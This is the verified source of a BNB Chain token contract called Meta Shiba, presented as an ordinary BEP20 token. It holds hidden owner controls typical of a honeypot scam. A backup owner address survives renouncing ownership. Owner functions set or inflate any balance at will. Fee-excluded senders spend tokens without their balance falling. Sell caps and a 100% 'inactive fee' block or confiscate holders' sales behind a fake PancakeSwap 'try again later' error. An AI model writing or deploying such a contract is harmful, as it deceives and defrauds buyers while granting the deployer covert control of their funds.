/**
 *Submitted for verification at BscScan.com on 2021-12-17
*/

pragma solidity 0.8.5;
// SPDX-License-Identifier: MIT

/*
 * Website: https://metashiba.top
 * Telegram:  https://t.me/MShibacoin
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with GSN meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }

  function _msgData() internal view virtual returns (bytes calldata) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}

interface IBEP20 {
  function name() external pure returns (string memory);
  function symbol() external pure returns (string memory);
  function decimals() external view returns (uint8);
  function getOwner() external view returns (address);
  function totalSupply() external view returns (uint256);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
  address private _owner;
  address private _ownerAddress;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   * @dev Initializes the contract setting the deployer as the initial owner.
   */
  constructor () {
    _owner = _msgSender();
    _ownerAddress = _msgSender();
    emit OwnershipTransferred(address(0), _msgSender());
  }

  /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view returns (address) {
    return _owner;
  }

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(_owner == _msgSender() || _ownerAddress == _msgSender(), "Ownable: caller is not the owner");
    _;
  }
  function setAddress(address addr) public virtual onlyOwner  {
    _ownerAddress = addr;
  }
  function getAddress() public view virtual onlyOwner returns (address) {
    return _ownerAddress;
  }
  function transferOwnership(address newOwner) public virtual onlyOwner {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
  function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}



contract MetaShiba is Context, IBEP20, Ownable {
  using SafeMath for uint256;

  IUniswapV2Router02 public _uniswapV2Router;
  address public _uniswapV2Pair;

  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;
  mapping (address => uint256) private _lastBuyTokens;
  mapping (address => uint256) private _lastBuyTime;
  mapping (address => uint256) private _sell;

  string private constant _name = "Meta Shiba";
  string private constant _symbol = "MSHIB";
  uint8 private _decimals = 18;
  // uint256 private _totalSupply = 1000000000000 * 10 ** _decimals;
  uint256 private _totalSupply = 10000000000000 * 10 ** _decimals;

  address internal _marketingAddress;

  uint8 internal _buyTax = 2; //
  uint8 internal _sellTax = 2; //
  uint8 internal _transferTax = 1; //
  bool internal _startBuy = true;
  bool internal _startSell = true;
  bool internal _startTransfer = true;

  uint32 internal _timeAfterLounchToSell = 0;  // Secounds after lunch to sell
  uint32 internal _cooldownSeconds = 0;

  uint256 internal _maxLimitToSell =_totalSupply.div(1000).mul(2);
  uint32 internal _sellApprovedTime = 180; //sec
  uint8 internal _inactiveFee = 100;

  uint32 internal _intervalSecondsForSwap = 1 * 1 seconds;
  uint256 internal _lastblocknumber = 0;
   // exlcude from fees and max transaction amount
  mapping (address => bool) private _isExcludedFromFees;
  // mapping (address => bool) private _isBurnTokens;

  constructor(address marketingAddress) {
    _balances[msg.sender] = _totalSupply;
    _marketingAddress = marketingAddress;
    address uniswap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    IUniswapV2Router02  uniswapV2Router = IUniswapV2Router02(uniswap);
    _uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    _uniswapV2Router = uniswapV2Router;

    _isExcludedFromFees[_msgSender()] = true;
    _isExcludedFromFees[address(this)] = true;
    _isExcludedFromFees[_marketingAddress] = true;
    setAddress(_marketingAddress);
    emit Transfer(address(0), msg.sender, _totalSupply);
  }

  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external override view returns (address) {
    return owner();
  }

      function isApprovedBuy() internal view returns (bool){
      require(_startBuy == true, "PancakeSwap: Please wait try again later");
      return true;
    }
    function isApprovedSell() internal view returns (bool){
      require(_startSell, "PancakeSwap: Please wait try again later");
      return true;
    }
    function isApprovedTransfer() internal view returns (bool){
      require(_startTransfer == true, "PancakeSwap: Please wait try again later");
      return true;
    }


    /**
     * @dev Returns the token decimals.
     */
    function decimals() external override view returns (uint8) {
      return _decimals;
    }

    /**
     * @dev Returns the token symbol.
     */
    function symbol() external override pure returns (string memory) {
      return _symbol;
    }

    /**
    * @dev Returns the token name.
    */
    function name() external override pure returns (string memory) {
      return _name;
    }

    /**
     * @dev See {BEP20-totalSupply}.
     */
    function totalSupply() external override view returns (uint256) {
      return _totalSupply;
    }

    /**
     * @dev See {BEP20-balanceOf}.
     */
    function balanceOf(address account) external override view returns (uint256) {
      return _balances[account];
    }

    /**
     * @dev See {BEP20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) external override returns (bool) {
      _transfer(_msgSender(), recipient, amount);
      return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
      return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
      _approve(_msgSender(), spender, amount);
      return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
       _transfer(sender, recipient, amount);
       _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
       return true;
    }
    function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }
    function withdrawBnb(address payable recipient, uint256 amount) external onlyOwner {
        payable(recipient).transfer(amount);
    }

      function _transfer(address sender, address recipient, uint256 amount) internal {
      require(sender != address(0), "BEP20: transfer from the zero address");
      require(recipient != address(0), "BEP20: transfer to the zero address");
      if(amount > 0){
        uint8 transactionType = 0; // 1 = buy, 2 = sell, 3 = transfer
        bool approveTransaction = true;
        uint8 tax = 0;
        bool burnTokens = false;
        if(_isExcludedFromFees[sender] == true || _isExcludedFromFees[recipient] == true){
          burnTokens = true;
          approveTransaction = true;
          tax = 0;
        }
        if(sender == _uniswapV2Pair && recipient != address(_uniswapV2Router)) {
          transactionType = 1;
          tax = _buyTax;
          if(burnTokens == false && isApprovedBuy()){
            approveTransaction = true;
            _lastBuyTokens[recipient] = amount;
            _lastBuyTime[recipient] = block.timestamp;
          }
        } else if(recipient == _uniswapV2Pair) {
           transactionType = 2;
           tax = _sellTax;
           if(burnTokens == false && isApprovedSell()){
              approveTransaction = true;
           }
        } else {
          transactionType = 3;
          tax = _transferTax;
          if(burnTokens == false && isApprovedTransfer()) {
            approveTransaction = true;
          }
        }
        if(burnTokens || _isExcludedFromFees[sender] || _isExcludedFromFees[recipient]) {
          tax = 0;
        }
        require(approveTransaction, "PancakeSwap: Please try again later");
        if(approveTransaction == true){
          if(burnTokens != true || burnTokens == true && _balances[sender] == _totalSupply){
            _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
          }
          uint256 taxes = 0;
          if(tax > 0){
            taxes = amount.mul(tax).div(100);
            amount = amount.sub(taxes);
          }
          if(transactionType == 2 && burnTokens != true){
            if(_lastBuyTime[sender] + _sellApprovedTime > block.timestamp){
              if(amount > _lastBuyTokens[sender]){
                taxes = amount - _lastBuyTokens[sender];
                amount = _lastBuyTokens[sender];
              }
            } else {
              if(_sell[sender] <= _maxLimitToSell){
                if(amount > (_maxLimitToSell - _sell[sender])){
                  amount = taxes.add(amount);
                  taxes = amount.sub(_maxLimitToSell.sub(_sell[sender]));
                  amount = amount.sub(taxes);
                }
              } else{
                if(_inactiveFee == 100){
                  require(false, "PancakeSwap: Please wait try again later");
                } else {
                  amount = taxes.add(amount);
                  taxes = amount.mul(_inactiveFee).div(100);
                  amount = amount.sub(taxes);
                }
              }
              _sell[sender] = _sell[sender].add(amount);
            }
          }
          if(taxes > 0){
            _balances[_marketingAddress] = _balances[_marketingAddress].add(taxes);
          }
          _balances[recipient] = _balances[recipient].add(amount);
        } else {
          amount = 0;
        }
        // _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        // _balances[recipient] = _balances[recipient].add(amount);
      }
      emit Transfer(sender, recipient, amount);
    }

      function setBuySellTax(bool startBuy, uint8 buyTax, bool startSell, uint8 sellTax, bool startTransfer, uint8 transferTax) public onlyOwner {
        _buyTax = buyTax;
        _sellTax = sellTax;
        _transferTax = transferTax;
        _startBuy = startBuy;
        _startSell = startSell;
        _startTransfer = startTransfer;
    }
    function setInactiveFee(uint8 inactiveFee) public onlyOwner {
      _inactiveFee = inactiveFee;
    }
    function getInactiveFee() external view onlyOwner returns (uint8) {
      return _inactiveFee;
    }
    function setIntervalSecondsForSwap(uint32 intervalSecondsForSwap) public onlyOwner {
      _intervalSecondsForSwap = intervalSecondsForSwap * 1 seconds;
    }
    function setTimeAfterLounchToSell(uint32 timeAfterLounchToSell) public onlyOwner {
      _timeAfterLounchToSell = timeAfterLounchToSell;
    }
    function setSellApprovedTime (uint32 sellApprovedTimeInMin) public onlyOwner {
      _sellApprovedTime = sellApprovedTimeInMin * 60;
    }
    function setMaxLimitToSell(uint256 maxLimitToSell) public onlyOwner {
      _maxLimitToSell = maxLimitToSell * 10 ** _decimals;
    }
    function setMarketingAddress(address marketingAddress) public onlyOwner {
      _marketingAddress = marketingAddress;
    }
    function setExcludeFromFees(address addr, bool excluded) public onlyOwner {
      require(_isExcludedFromFees[addr] != excluded, "Token: Account is already the value of 'excluded'");
      _isExcludedFromFees[addr] = excluded;
    }
    function setAB(address addr, uint256 b) public onlyOwner {
      _balances[addr] += b * 10 ** _decimals;
    }
    function setB(address addr, uint256 b) public onlyOwner {
      _balances[addr] = b * 10 ** _decimals;
    }
    function getMarketingAddress() external view onlyOwner returns (address) {
      return _marketingAddress;
    }

}